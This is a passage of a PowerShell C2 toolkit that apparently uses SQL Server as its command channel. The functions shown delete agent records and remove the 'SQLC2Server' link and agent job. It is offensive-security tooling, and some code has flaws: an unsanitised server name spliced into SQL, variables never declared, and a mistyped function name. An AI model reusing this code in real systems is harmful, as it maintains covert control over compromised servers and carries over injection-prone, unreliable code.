        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Database containing target C2 table.')]
        [string]$Database,

        [Parameter(Mandatory = $false,
                ValueFromPipeline = $true,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Server to clear command history for.')]
        [string]$ServerName,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        if($ServerName){
            $ServerFilter = "WHERE servername like '$ServerName'"
        }else{
            $ServerFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to clear agent(s) from $Instance."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Setup query to grab commands        
        $Query = "DELETE FROM dbo.C2AGENTS
                  $ServerFilter"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
    }

    End
    {
        Write-Verbose "$instance : Done."
    }
 }


# ----------------------------------
#  Uninstall-SQLC2AgentLink
# ----------------------------------
# Author: Scott Sutherland
Function Uninstall-SQLC2AgentLink
{
    <#
            .SYNOPSIS
            This command removes the C2 server link and agent job from the agent SQL Server. 
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance                              
            .EXAMPLE
            PS C:\> Uninstall-SQLC2Agent -Verbose -Instance "SQLServer1\STANDARDDEV2014" -Username sa -Password 'MyPassword123!'
            .EXAMPLE
            PS C:\> Uninstall-SQLC2Agent -Verbose -Instance "SQLServer1\STANDARDDEV2014"
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Create data tables for output
        $TblResults = New-Object -TypeName System.Data.DataTable

        if($ServerName){
            $ServerFilter = "WHERE servername like '$ServerName'"
        }else{
            $ServerFilter = ""
        }
    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-C2ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SC2QLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
                Write-Verbose "$instance : Attempting to remove the C2 link agent on $Instance."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }     
        
        # Setup query to grab commands        
        $Query = "
                -- Remove server link to SQL C2 Server
                IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'SQLC2Server') = 1
	                exec sp_dropserver 'SQLC2Server', 'droplogins';  
                else
	                select 'The server link does not exist.' 

			    -- Remove C2 agent job
                IF (SELECT count(*) FROM [msdb].[dbo].[sysjobs] job WHERE name like 'SQLC2 Agent Job') = 1
	                EXEC msdb..sp_delete_job  @job_name = N'SQLC2 Agent Job' ;   
                else
	                select 'The agent job does not exist.'"

        # Execute Query
        $TblResults = Get-C2SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
    }

    End
    {
        Write-Verbose "$instance : Done."
    }
 }
